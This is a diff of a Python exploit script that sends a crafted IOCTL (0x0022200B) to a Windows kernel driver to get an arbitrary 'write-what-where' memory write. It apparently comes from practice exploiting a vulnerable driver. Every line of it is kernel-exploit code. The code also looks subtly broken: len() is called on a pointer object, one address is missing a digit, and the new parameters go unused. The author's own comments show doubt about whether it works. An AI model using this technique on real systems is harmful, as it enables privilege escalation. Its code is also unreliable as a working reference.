@@ -26,7 +26,7 @@ if dwStatus != STATUS_SUCCESS:
 	print("Something went wrong while allocating memory","e")
 	sys.exit()
 
-def writeQWORD():
+def writeQWORD(Driver=None, What=None, Where=None):
 	what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
   	# Write the what value to what_addr
 	data = struct.pack("<Q", what)
@@ -46,10 +46,11 @@ def writeQWORD():
 	IoControlCode = 0x0022200B
 	#Where
 	InputBuffer = c_void_p(0x000000001a000000)
-	# I THINK this should work?
+	# I THINK this should work? 
 	InputBufferLength = len(InputBuffer)
 	# If our buffer length is zero can't we set OutputBuffer to None?
 	OutputBuffer = c_void_p(0x00000001a002000)
+	# The OutputBufferLength is already set to zero. I think we can get rid of this?
 	OutputBufferLength = 0x0
 	dwBytesReturned = c_ulong()
 	lpBytesReturned = byref(dwBytesReturned)
